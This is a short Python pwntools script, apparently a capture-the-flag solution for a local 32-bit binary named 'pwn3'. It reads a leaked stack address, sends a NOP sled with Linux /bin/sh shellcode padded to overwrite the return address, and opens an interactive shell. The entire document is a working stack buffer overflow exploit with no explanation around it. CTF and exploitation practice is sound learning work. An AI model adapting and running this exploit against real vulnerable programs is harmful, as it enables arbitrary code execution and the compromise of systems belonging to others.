#!/usr/bin/python 
from pwn import *

context.arch = 'i386'
p = process("./pwn3")
shellcode = asm(shellcraft.i386.linux.sh())

p.recvuntil("number ")
addr = int(p.recv(10), 16)
log.info("addr : "+hex(addr))

p.sendlineafter("? ", '\x90'*100 + shellcode + '\x90'*(0xEE+0x4 - len(shellcode) - 100) + p32(addr))

p.interactive()
